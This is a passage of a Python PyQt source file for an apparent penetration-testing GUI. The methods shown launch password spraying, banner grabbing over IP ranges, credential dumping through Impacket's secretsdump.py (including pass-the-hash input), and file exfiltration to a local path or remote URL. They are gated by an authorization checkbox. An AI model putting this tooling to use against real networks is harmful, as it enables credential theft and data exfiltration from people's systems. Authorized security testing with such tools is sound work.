        self.password_spray_worker.update_output.connect(self.update_password_spray_output)
        self.password_spray_worker.update_status.connect(self.status_bar.setText)
        self.password_spray_worker.password_spray_finished.connect(self.on_password_spray_finished)
        self.password_spray_worker.start()

    def stop_password_spray(self):
        if self.password_spray_running:
            if self.password_spray_worker and self.password_spray_worker.isRunning():
                self.password_spray_worker.stop()
            self.password_spray_running = False
            self.start_password_spray_button.setEnabled(True)
            self.stop_password_spray_button.setEnabled(False)
            self.status_bar.setText("Password spray stopped.")
        else:
            self.show_message_box("No Password Spray Running", "No active password spray operation to stop.")

    def on_password_spray_finished(self):
        self.password_spray_running = False
        self.start_password_spray_button.setEnabled(True)
        self.stop_password_spray_button.setEnabled(False)
        self.password_spray_worker = None # Clear worker reference

    def update_password_spray_output(self, message):
        self.password_spray_output_text.append(message.strip())
        self.password_spray_output_text.verticalScrollBar().setValue(self.password_spray_output_text.verticalScrollBar().maximum())

    # --- Banner Grabbing Methods ---
    def start_banner_grabbing(self):
        if self.banner_grabbing_running:
            self.show_message_box("Banner Grabbing in Progress", "A banner grabbing operation is already running.")
            return

        if not self.authorization_checked:
            self.show_message_box("Authorization Required",
                                   "You must confirm you have explicit authorization to scan and interact with this network.",
                                   QMessageBox.Icon.Warning)
            return

        target_input = self.banner_grab_target_entry.text().strip()
        port_input = self.banner_grab_port_entry.text().strip()

        if not target_input or not port_input:
            self.show_message_box("Input Error", "Please enter a target IP/hostname/CIDR and port(s).", QMessageBox.Icon.Critical)
            return

        # --- Parse Targets (IPs from CIDR, Hostname, or single IP) ---
        targets_to_scan = []
        try:
            # Try to parse as CIDR
            network = ipaddress.ip_network(target_input, strict=False)
            if network.prefixlen < 32: # It's a subnet
                targets_to_scan.extend([str(ip) for ip in network.hosts()])
            else: # It's a single IP in CIDR format (e.g., 192.168.1.1/32)
                targets_to_scan.append(str(network.network_address))
        except ValueError:
            # Not a CIDR, try hostname resolution
            try:
                targets_to_scan.append(socket.gethostbyname(target_input))
            except socket.gaierror:
                self.show_message_box("Input Error", f"Hostname '{target_input}' could not be resolved.", QMessageBox.Icon.Critical)
                return
            except Exception as e:
                self.show_message_box("Input Error", f"Invalid target IP/Hostname/CIDR: {e}", QMessageBox.Icon.Critical)
                return

        if not targets_to_scan:
            self.show_message_box("Input Error", "No valid target IPs could be determined.", QMessageBox.Icon.Critical)
            return

        # --- Parse Ports (comma-separated) ---
        ports_to_scan = []
        port_strings = [p.strip() for p in port_input.split(',') if p.strip()]
        if not port_strings:
            self.show_message_box("Input Error", "Please enter at least one valid port.", QMessageBox.Icon.Critical)
            return

        for p_str in port_strings:
            try:
                port = int(p_str)
                if not (1 <= port <= 65535):
                    raise ValueError("Port out of range")
                ports_to_scan.append(port)
            except ValueError:
                self.show_message_box("Input Error", f"Invalid port number: '{p_str}'. Ports must be integers between 1 and 65535.", QMessageBox.Icon.Critical)
                return

        # --- Create a list of (IP, Port) tuples for the worker ---
        target_ip_port_list = []
        for ip in targets_to_scan:
            for port in ports_to_scan:
                target_ip_port_list.append((ip, port))

        self.banner_grab_output_text.clear()
        self.status_bar.setText(f"Grabbing banners from {len(target_ip_port_list)} targets...")
        self.banner_grabbing_running = True
        self.start_banner_grab_button.setEnabled(False)
        self.stop_banner_grab_button.setEnabled(True)

        self.banner_grab_worker = BannerGrabbingWorker(target_ip_port_list, self.authorization_checked)
        self.banner_grab_worker.data_available.connect(self._process_banner_grab_results_from_queue) # Connect new signal
        self.banner_grab_worker.update_status.connect(self.status_bar.setText)
        self.banner_grab_worker.grab_finished.connect(self.on_banner_grab_finished)
        self.banner_grab_worker.start()
        self.banner_grab_results_timer.start() # Start the timer for processing results

    def _process_banner_grab_results_from_queue(self):
        """Reads all available results from the banner grab worker's queue and updates the QTextEdit."""
        if self.banner_grab_worker and hasattr(self.banner_grab_worker, 'results_queue'):
            results_batch = []
            while True:
                try:
                    item = self.banner_grab_worker.results_queue.get_nowait()
                    results_batch.append(item)
                except Empty:
                    break
            if results_batch:
                self.banner_grab_output_text.append("".join(results_batch))
                # Auto-scroll to the bottom
                self.banner_grab_output_text.verticalScrollBar().setValue(self.banner_grab_output_text.verticalScrollBar().maximum())


    def stop_banner_grabbing(self):
        if self.banner_grabbing_running:
            if self.banner_grab_worker and self.banner_grab_worker.isRunning():
                self.banner_grab_worker.stop()
            self.banner_grabbing_running = False
            self.start_banner_grab_button.setEnabled(True)
            self.stop_banner_grab_button.setEnabled(False)
            self.status_bar.setText("Banner grabbing stopped.")
            if self.banner_grab_results_timer and self.banner_grab_results_timer.isActive(): # Check if timer exists and is active
                self.banner_grab_results_timer.stop() # Stop the timer
            self._process_banner_grab_results_from_queue() # Final flush
        else:
            self.show_message_box("No Banner Grabbing Running", "No active banner grabbing operation to stop.")

    def on_banner_grab_finished(self):
        self.banner_grabbing_running = False
        self.start_banner_grab_button.setEnabled(True)
        self.stop_banner_grab_button.setEnabled(False)
        if self.banner_grab_results_timer and self.banner_grab_results_timer.isActive(): # Check if timer exists and is active
            self.banner_grab_results_timer.stop() # Stop the timer
        self._process_banner_grab_results_from_queue() # Final flush
        self.banner_grab_worker = None # Clear worker reference

    # Removed update_banner_grab_output as it's replaced by _process_banner_grab_results_from_queue
    # def update_banner_grab_output(self, message):
    #     self.banner_grab_output_text.append(message.strip())
    #     self.banner_grab_output_text.verticalScrollBar().setValue(self.banner_grab_output_text.verticalScrollBar().maximum())

    # --- Password Dumping Methods (secretsdump.py) ---
    def on_secretsdump_auth_type_changed(self):
        if self.secretsdump_use_hashes_checkbox.isChecked():
            self.secretsdump_password_label.setText("Hash (LM:NT):")
            self.secretsdump_password_entry.setPlaceholderText("e.g., aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0")
            self.secretsdump_password_entry.setEchoMode(QLineEdit.EchoMode.Normal)
        else:
            self.secretsdump_password_label.setText("Password:")
            self.secretsdump_password_entry.setPlaceholderText("e.g., MySuperSecretPassword1!")
            self.secretsdump_password_entry.setEchoMode(QLineEdit.EchoMode.Password)

    def start_password_dumping(self):
        if self.password_dumping_running:
            self.show_message_box("Password Dumping in Progress", "A password dumping operation is already running.")
            return

        if not self.authorization_checked:
            self.show_message_box("Authorization Required",
                                   "You must confirm you have explicit authorization to scan and interact with this network.",
                                   QMessageBox.Icon.Warning)
            return

        target_ip = self.secretsdump_target_entry.text().strip()
        username = self.secretsdump_username_entry.text().strip()
        password_or_hash = self.secretsdump_password_entry.text().strip()
        domain = self.secretsdump_domain_entry.text().strip()
        use_hashes = self.secretsdump_use_hashes_checkbox.isChecked()
        additional_options = self.secretsdump_options_entry.text().strip()

        if not target_ip or not username or not password_or_hash:
            self.show_message_box("Input Error", "Please enter Target IP, Username, and Password/Hash.",
                                  QMessageBox.Icon.Critical)
            return

        # Check if secretsdump.py is available
        if not shutil.which("secretsdump.py"):
            self.show_message_box("secretsdump.py Not Found", "secretsdump.py command not found. Please install Impacket and ensure 'secretsdump.py' is in your system's PATH.", QMessageBox.Icon.Warning)
            return

        self.password_dump_output_text.clear()
        self.status_bar.setText("Running secretsdump.py...")
        self.password_dumping_running = True
        self.start_password_dump_button.setEnabled(False)
        self.stop_password_dump_button.setEnabled(True)

        self.secretsdump_worker = SecretsdumpWorker(
            target_ip, username, password_or_hash, domain, use_hashes, additional_options, self.authorization_checked
        )
        self.secretsdump_worker.update_output.connect(self.update_password_dump_output)
        self.secretsdump_worker.update_status.connect(self.status_bar.setText)
        self.secretsdump_worker.secretsdump_finished.connect(self.on_password_dump_finished)
        self.secretsdump_worker.start()

    def stop_password_dumping(self):
        if self.password_dumping_running:
            if self.secretsdump_worker and self.secretsdump_worker.isRunning():
                self.secretsdump_worker.stop()
            self.password_dumping_running = False
            self.start_password_dump_button.setEnabled(True)
            self.stop_password_dump_button.setEnabled(False)
            self.status_bar.setText("Password dumping stopped.")
        else:
            self.show_message_box("No Password Dump Running", "No active password dumping operation to stop.")

    def on_password_dump_finished(self):
        self.password_dumping_running = False
        self.start_password_dump_button.setEnabled(True)
        self.stop_password_dump_button.setEnabled(False)
        self.secretsdump_worker = None # Clear worker reference

    def update_password_dump_output(self, message):
        self.password_dump_output_text.append(message.strip())
        self.password_dump_output_text.verticalScrollBar().setValue(self.password_dump_output_text.verticalScrollBar().maximum())

    # --- Exfil Methods ---
    def create_dummy_file(self):
        if os.path.exists(self.dummy_file_path):
            if not self.show_confirm_box("File Exists", f"'{self.dummy_file_path}' already exists. Overwrite?"):
                return

        self.create_dummy_button.setEnabled(False)
        self.dummy_file_progress.setValue(0)
        self.dummy_file_progress_label.setText("Creating dummy file...")
        self.status_bar.setText("Creating dummy file...")

        self.dummy_file_worker = DummyFileWorker(self.dummy_file_path, self.dummy_file_size_mb)
        self.dummy_file_worker.update_progress.connect(self.dummy_file_progress.setValue)
        self.dummy_file_worker.update_label.connect(self.dummy_file_progress_label.setText)
        self.dummy_file_worker.update_status.connect(self.status_bar.setText)
        self.dummy_file_worker.file_created.connect(self.update_exfil_output)
        self.dummy_file_worker.error_occurred.connect(self.update_exfil_output)
        self.dummy_file_worker.finished.connect(lambda: self.create_dummy_button.setEnabled(True))
        self.dummy_file_worker.start()

    def start_exfil_server(self):
        global simulated_exfil_server, simulated_exfil_server_thread

        if simulated_exfil_server_thread and simulated_exfil_server_thread.is_alive(): # Check if thread is alive
            self.show_message_box("Server Running", "Exfil server is already running.")
            return

        self.update_exfil_output(f"Starting simulated exfil server on port {SIMULATED_EXFIL_SERVER_PORT}...\n")
        self.status_bar.setText("Starting exfil server...")

        self.exfil_server_worker = ExfilServerWorker(SIMULATED_EXFIL_SERVER_PORT)
        self.exfil_server_worker.server_started.connect(lambda msg: (self.update_exfil_output(msg), self.status_bar.setText("Exfil server running."), self.start_server_button.setEnabled(False), self.stop_server_button.setEnabled(True)))
        self.exfil_server_worker.server_stopped.connect(lambda msg: (self.update_exfil_output(msg), self.status_bar.setText("Exfil server stopped."), self.start_server_button.setEnabled(True), self.stop_server_button.setEnabled(False)))
        self.exfil_server_worker.server_error.connect(lambda msg: (self.update_exfil_output(msg), self.status_bar.setText(f"Error: {msg.strip()}"), self.show_message_box("Server Error", msg, QMessageBox.Icon.Critical)))
        self.exfil_server_worker.start()
        simulated_exfil_server_thread = self.exfil_server_worker # Store the QThread instance

    def stop_exfil_server(self):
        global simulated_exfil_server_thread
        if simulated_exfil_server_thread and simulated_exfil_server_thread.is_alive():
            self.update_exfil_output("Stopping simulated exfil server...\n")
            self.status_bar.setText("Stopping exfil server...")
            if self.exfil_server_worker:
                self.exfil_server_worker.stop() # Call stop method on the QThread
            simulated_exfil_server_thread = None # Clear the reference
        else:
            self.show_message_box("Server Not Running", "Exfil server is not running.")

    def select_file_for_exfil(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Select File to Exfiltrate")
        if file_path:
            self.exfil_uploaded_file_path = file_path
            self.exfil_selected_file_label.setText(f"Selected: {os.path.basename(file_path)}")
        else:
            self.exfil_uploaded_file_path = None
            self.exfil_selected_file_label.setText("No file selected for exfil.")


    def on_exfil_type_select(self):
        selected_type = self.exfil_type_combobox.currentText()

        # Hide/show elements based on selected type
        self.local_dest_label.setVisible(selected_type in ["Local (Internal)", "Both"])
        self.local_dest_entry.setVisible(selected_type in ["Local (Internal)", "Both"])
        self.remote_url_label.setVisible(selected_type in ["Remote (External)", "Both"])
        self.exfil_remote_url_entry.setVisible(selected_type in ["Remote (External)", "Both"])


    def perform_exfil(self):
        if self.exfil_running:
            self.show_message_box("Exfil in Progress", "An exfil operation is already running.")
            return

        if not self.authorization_checked:
            self.show_message_box("Authorization Required",
                                   "You must confirm you have explicit authorization to scan and interact with this network.",
                                   QMessageBox.Icon.Warning)
            return

        source_file = self.exfil_uploaded_file_path # Use the uploaded file path
        if not source_file:
            self.show_message_box("File Not Selected", "Please select a file to exfiltrate using 'Select File for Exfil'.",
                                  QMessageBox.Icon.Critical)
            return

        if not os.path.exists(source_file):
            self.show_message_box("File Not Found", f"Source file '{source_file}' does not exist.",
                                  QMessageBox.Icon.Critical)
            return


        exfil_type = self.exfil_type_combobox.currentText()
        local_dest_dir = self.local_dest_entry.text().strip()
        remote_url = self.exfil_remote_url_entry.text().strip()

        if exfil_type == "Local (Internal)" and not local_dest_dir:
            self.show_message_box("Input Error", "Please enter a local destination path for exfil.",
                                  QMessageBox.Icon.Critical)
            return
        elif exfil_type == "Remote (External)" and not remote_url:
            self.show_message_box("Input Error", "Please enter a remote exfil URL.",
                                  QMessageBox.Icon.Critical)
            return
        elif exfil_type == "Both" and (not local_dest_dir or not remote_url):
            self.show_message_box("Input Error", "Please enter both local destination path and remote exfil URL for 'Both' mode.",
                                  QMessageBox.Icon.Critical)
            return

        if exfil_type in ["Local (Internal)", "Both"]:
            try:
                os.makedirs(local_dest_dir, exist_ok=True)
            except Exception as e:
                self.show_message_box("Directory Error", f"Could not create local destination directory: {e}",
                                      QMessageBox.Icon.Critical)
                return

        self.exfil_output_text.clear()
        self.exfil_output_text.append(f"Attempting simulated exfil ({exfil_type})...\n")
        self.status_bar.setText("Performing exfil...")
        self.exfil_progress.setValue(0)
        self.exfil_progress_label.setText("Exfil in progress...")

        self.exfil_running = True
        self.perform_exfil_button.setEnabled(False)

        self.exfil_worker = ExfilWorker(source_file, local_dest_dir, remote_url, exfil_type)
        self.exfil_worker.update_progress.connect(self.exfil_progress.setValue)
        self.exfil_worker.update_label.connect(self.exfil_progress_label.setText)
        self.exfil_worker.update_status.connect(self.status_bar.setText)
        self.exfil_worker.update_output.connect(self.update_exfil_output)
        self.exfil_worker.error_occurred.connect(self.update_exfil_output)
        self.exfil_worker.exfil_finished.connect(self.on_exfil_finished)
        self.exfil_worker.start()

    def on_exfil_finished(self):
        self.exfil_running = False
        self.perform_exfil_button.setEnabled(True)
        self.exfil_worker = None # Clear worker reference

    def update_exfil_output(self, message):
        self.exfil_output_text.append(message.strip())
        self.exfil_output_text.verticalScrollBar().setValue(self.exfil_output_text.verticalScrollBar().maximum())


# --- Run the Application ---
if __name__ == "__main__":
    # Check and install dependencies first
    if not check_and_install_dependencies():
        # If dependency installation fails, print a message and exit
        print("Exiting due to failed dependency installation. Please install missing packages manually.")
        sys.exit(1)

    # Re-attempt import scapy after potential installation
    # This ensures SCAPY_AVAILABLE is correctly set for the application logic
    try:
        # These imports are needed for ScapyNetworkScanWorker
        from scapy.all import ARP, Ether, srp, wrpcap
        SCAPY_AVAILABLE = True
    except ImportError:
        print("Warning: Scapy is still not available after installation attempt. Network Discovery features will be unavailable.")
        SCAPY_AVAILABLE = False # Ensure it's False if import still fails

    app = QApplication(sys.argv)
    window = NetworkPenTestTool()
    window.show()
    sys.exit(app.exec())
